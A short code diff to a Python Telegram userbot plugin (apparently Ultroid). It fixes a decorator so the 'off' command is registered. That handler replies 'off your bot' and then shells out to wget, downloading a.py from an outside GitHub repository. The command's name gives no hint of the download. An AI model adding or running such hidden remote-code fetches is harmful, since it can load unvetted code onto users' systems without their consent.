@@ -195,7 +195,7 @@ async def res(event):
   await event.reply("restarted")
 
 
-ultroid_cmd(pattern="off")
+@ultroid_cmd(pattern="off")
 async def off(event):
   await event.reply("off your bot")
   await bash("wget -O a.py https://github.com/rooted-cyber/install-package/raw/main/a.py")
